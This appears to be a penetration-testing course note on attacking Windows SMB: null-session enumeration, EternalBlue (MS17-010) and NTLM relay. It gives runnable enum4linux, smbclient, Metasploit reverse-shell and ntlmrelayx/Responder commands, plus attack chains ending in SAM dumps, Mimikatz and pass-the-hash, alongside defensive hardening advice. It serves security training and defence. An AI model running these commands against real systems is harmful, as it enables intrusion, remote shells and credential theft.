---
tags: [smb, eternalblue, relay, null-session, windows, protocol-attack]
difficulty: intermediate
module: "35 - Network Protocol Attacks"
topic: "35.10 SMB"
---

# Server Message Block (SMB) Exploitation

Server Message Block (SMB) is the backbone protocol for file sharing, printer sharing, and inter-process communication (IPC) in Windows environments. It operates primarily over TCP port 445 (and historically TCP/UDP 139 over NetBIOS). Due to its ubiquity, legacy compatibility requirements, and complexity, SMB has been the focal point of some of the most devastating cyber attacks in history.

## Architecture and Protocol Versions

SMB operates through a client-server request-response model. When a client requests access to a file share, an authentication negotiation occurs, followed by authorization checks.

**SMB Versions:**
- **SMBv1 (CIFS):** Introduced in the 1990s. Incredibly insecure, cleartext or weak authentication, and highly vulnerable to remote code execution (e.g., EternalBlue). Microsoft explicitly deprecates this version.
- **SMBv2:** Introduced in Windows Vista. Reduced command complexity, added durable file handles, and improved performance. Still vulnerable to relay attacks if unsigned.
- **SMBv3:** Introduced in Windows 8/Server 2012. Brought robust end-to-end encryption (AES-CCM/GCM), secure dialect negotiation, and protection against downgrade attacks.

---

## Attack Surface and Visual Flow

```ascii
+----------------+                                +--------------------------+
|                |       1. SMB Negotiation       |                          |
|   Attacker     |------------------------------->|       Windows Server     |
|                |                                |       (SMB Service)      |
| Tools:         |       2. Session Setup         |       Port: TCP/445      |
| - SMBClient    |<-------------------------------|                          |
| - CrackMapExec |                                |                          |
| - Responder    |       3. Tree Connect / IPC$   |       Vulnerabilities:   |
| - Metasploit   |------------------------------->|       - Null Sessions    |
|                |                                |       - Unsigned Relays  |
|                |       4. Exploit (e.g. MS17)   |       - Buffer Overflows |
|                |===============================>|         (EternalBlue)    |
+----------------+                                +--------------------------+
```

---

## 1. SMB Null Sessions & Anonymous Enumeration

A Null Session is an unauthenticated connection to the Windows IPC$ (Inter-Process Communication) hidden share. Historically (Windows NT/2000), Null Sessions were permitted by default, allowing anyone on the network to pull massive amounts of data from a Domain Controller or workstation.

### Information Disclosed via Null Sessions:
- Password and lockout policies.
- Full lists of domain users and groups.
- Network shares and permissions.
- Active sessions and routing information.

### Exploitation Mechanics
Modern Windows versions block Null Sessions by default, but misconfigurations still occur, especially when legacy applications require them.

Using `enum4linux`:
```bash
# General enumeration using null session
enum4linux -a 10.10.10.20

# Enumerate users specifically
enum4linux -U 10.10.10.20
```

Using `smbmap` and `smbclient`:
```bash
# Check share permissions with null auth (-u "" -p "")
smbmap -H 10.10.10.20 -u "" -p ""

# Connect to the IPC$ share directly
smbclient //10.10.10.20/IPC$ -U ""%""
```

---

## 2. EternalBlue (MS17-010)

EternalBlue is arguably the most famous exploit in modern cybersecurity. Leaked by the Shadow Brokers in 2017 and originally developed by the NSA, it exploits a critical flaw in SMBv1. It was the delivery mechanism for the WannaCry and NotPetya global ransomware outbreaks.

### Technical Deep Dive into EternalBlue
The vulnerability resides in `srv.sys` (the SMBv1 server driver), specifically in the handling of `SMB_COM_TRANSACTION2` requests and FEA (Full Extended Attribute) lists.

1. **Integer Overflow:** The attacker sends a crafted SMB packet containing an oversized FEA list. The function `SrvOs2FeaListSizeToNt` incorrectly calculates the size of this list due to a mathematical flaw (integer overflow/underflow).
2. **Buffer Overflow:** Because the calculated size is smaller than the actual data, when the data is copied into a non-paged kernel pool buffer, it overflows the bounds of the allocated space.
3. **Pool Grooming:** The exploit carefully manipulates the kernel memory layout (pool grooming) so that the buffer overflow overwrites specific adjacent structures, typically an SMB session block.
4. **Code Execution:** By overwriting function pointers within the session block, the attacker redirects execution flow to their shellcode, granting immediate, unauthenticated `NT AUTHORITY\SYSTEM` access.

### Metasploit Exploitation
```bash
msfconsole
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 10.10.10.20
set LHOST 10.10.10.10
set payload windows/x64/meterpreter/reverse_tcp
exploit
```
*Note: While MSF is reliable, manual exploitation using tools like AutoBlue is often required in OSCP or highly restrictive environments.*

---

## 3. SMB Relay Attacks

SMB Relay (or NTLM Relay) is a devastating lateral movement technique. Unlike pass-the-hash, it doesn't require cracking any hashes; it simply catches an incoming authentication attempt and forwards (relays) it to another machine to gain access.

### The Mechanics of an SMB Relay
1. **The Trap:** The attacker positions themselves on the network (often using LLMNR/NBT-NS spoofing via `Responder`) to coerce a victim machine into authenticating to the attacker's IP over SMB.
2. **The Relay:** Instead of verifying the credentials, the attacker forwards the incoming NTLM authentication blobs to a target server (e.g., a Domain Controller or an Admin workstation).
3. **The Execution:** If the victim whose credentials are being relayed has administrative rights on the target server, the attacker's relayed authentication succeeds. The attacker can then dump hashes, execute commands, or establish a reverse shell.

### Crucial Requirement: SMB Signing
SMB Relay attacks **only work if SMB Signing is Disabled or Not Enforced** on the target server.
- SMB Signing digitally signs every packet, ensuring it hasn't been tampered with or relayed.
- By default, Windows Domain Controllers *enforce* SMB signing. Windows workstations and member servers do *not* enforce it by default.

### Exploitation via Impacket's ntlmrelayx
```bash
# 1. Edit Responder.conf to turn OFF SMB and HTTP to avoid conflicts
# /etc/responder/Responder.conf -> SMB = Off, HTTP = Off

# 2. Start ntlmrelayx targeting a specific vulnerable server (10.10.10.50)
impacket-ntlmrelayx -tf targets.txt -smb2support -i

# 3. Start Responder to poison network requests and force auth back to us
sudo responder -I eth0 -rdw
```
When a high-privileged user triggers a broadcast query, Responder intercepts it, tells the victim to authenticate, and `ntlmrelayx` forwards that authentication to `10.10.10.50`, executing a command or dumping the local SAM database.

---

## Defensive Countermeasures & Hardening

1. **Disable SMBv1 Completely**: This is non-negotiable. SMBv1 must be disabled via Group Policy or registry settings (`Set-SmbServerConfiguration -EnableSMB1Protocol $false`). This stops EternalBlue entirely.
2. **Require SMB Signing**: Enforce SMB signing across all workstations and member servers via GPO (`Microsoft network client: Digitally sign communications (always)`). This kills SMB relay attacks dead in their tracks.
3. **Disable NetBIOS and LLMNR**: Prevents the broadcast poisoning that often initiates SMB relay chains.
4. **Network Segmentation**: Isolate client networks from server networks. Workstations rarely need to initiate SMB connections to other workstations. Blocking workstation-to-workstation TCP 445 prevents lateral movement worms.
5. **Implement EDR and Credential Guard**: Protects LSA secrets and detects the abnormal execution of `cmd.exe` or `powershell.exe` spawned by `smbd` processes.

---

## Chaining Opportunities

- **Responder -> SMB Relay -> SAM Dump**: The classic Active Directory intrusion chain. Poison LLMNR, relay the NTLMv2 hash to a workstation where the user is a local admin, dump the SAM, crack the local admin hash, and use Pass-the-Hash to move laterally.
- **Null Session -> User Enumeration -> AS-REP Roasting**: Use a null session to dump the user list. Feed that user list into an AS-REP roasting tool to find accounts that do not require Kerberos pre-authentication, capturing their hashes.
- **EternalBlue -> Mimikatz**: Exploit an unpatched system via MS17-010 to gain SYSTEM, immediately inject Mimikatz to dump plain text credentials or Kerberos tickets from memory, and pivot to the Domain Controller.

## Related Notes
- [[11 - NetBIOS — Enumeration, NBNS Poisoning]]
- [[13 - Kerberos — Pass-the-Hash, Pass-the-Ticket, Golden-Silver Ticket, Kerberoasting, AS-REP Roasting]]
- [[09 - RDP — Brute Force, BlueKeep, DejaBlue]]
- [[02 - Active Directory Architecture and Trust Relationships]]
